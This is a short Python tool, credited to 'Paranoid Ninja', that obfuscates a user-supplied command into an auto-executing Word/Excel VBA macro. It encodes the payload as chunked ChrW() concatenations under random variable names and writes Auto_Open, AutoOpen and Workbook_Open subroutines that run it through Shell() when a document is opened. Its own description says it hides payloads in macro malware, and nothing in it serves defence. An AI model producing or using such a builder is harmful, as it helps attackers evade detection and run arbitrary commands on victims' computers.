#!/usr/bin/python3i

##Author : Paranoid Ninja
##Email  : paranoidninja@protonmail.com
##Descr  : This script encodes the VBA payload for macro malwares

import random
import string

_author_ = "Paranoid Ninja"
_email_ = "paranoidninja@protonmail.com"
_descr_ = "This script obfuscates the VBA payload to hide it in word macro malwares"

#pl = payload length
#pq = payload quotient
#pr = payload remainder
#svs = split value start
#sve = split value end

print("Author : " + _author_ + "\n" + "Email  : " + _email_ + "\n" + "Descr  : " + _descr_ + "\n" )

def payload_calc(payload):
	#payload_split = list(payload)
	pl = len(payload)
	pq = pl//30		#Splitting payload into 30 bytes each
	pr = pl%30		#Reminder after splitting payload into 30 equal bytes
	if (pr != 0):
		pvar = pq + 1
	else:
		pvar = pq
	#print(payload_array) #Debug
	return pl, pq, pr, pvar


def obfuscate_payload(payload, pvar):
	i = 0
	svs = 30
	payload_dict = []
	payload_dict.append(payload[:30])
	while (i != pvar):
		sve = svs + 30
		payload_dict.append(payload[svs:sve])
		svs += 30
		i += 1
	z = ""
	obfuscated_payload_list = []
	for x in payload_dict:
		for y in x:
			z += "ChrW(" + str(ord(y)) + ") & "
		obfuscated_payload_list.append(z[:-2])
		z = ""
	obfuscated_payload_list = list(filter(None, obfuscated_payload_list))

	payload_string_list = []
	i = 0
	while (i < (pvar+1)):
		payload_string_list.append(''.join(random.choice(string.ascii_letters) for i in range(8)))
		i += 1

	combined_payload_string = ""
	for x in payload_string_list:
		combined_payload_string += x + " + "
	combined_payload_string = combined_payload_string[:-14]

	#print("Payload variables used\t\t: %s" %combined_payload_string)

	print("Writing payload to file\t\t\t: macro_payload.txt\n")
	with open('macro_payload.txt', 'w+') as payload_file:
		payload_file.write("Sub Auto_Open()\n")
		for i in payload_string_list:
			payload_file.write("\tDim %s As String\n" %i)
		for i in range(len(obfuscated_payload_list)):
			payload_file.write("\t%s = %s\n" %(payload_string_list[i], obfuscated_payload_list[i]))
		payload_file.write("\t%s = %s\n" %(payload_string_list[-1], combined_payload_string))

		payload_file.write("\tShell(%s)\n" %payload_string_list[-1])
		payload_file.write("End Sub\n")
		payload_file.write("Sub AutoOpen()\n")
		payload_file.write("\tAuto_Open\n")
		payload_file.write("End Sub\n")
		payload_file.write("Sub Workbook_Open()\n")
		payload_file.write("\tAuto_Open\n")
		payload_file.write("End Sub\n")
	payload_file.close()


def main():
	payload = input("Enter VBA payload> ")
	ppool = payload_calc(payload)
	print("\nTotal payload length \t\t\t: " + str(ppool[0]) + " bytes" )
	print("Total count of payload variables\t: " + str(ppool[3]))
	print("Count of extra end bytes\t\t: " + str(ppool[2]))
	obfuscate_payload(payload, ppool[3])
	#print("\n")
	#for i in pd:
	#	print( str(''.join(random.choice(string.ascii_letters) for i in range(8))) + " = " + i + "\n")

if __name__ == "__main__":
	main()
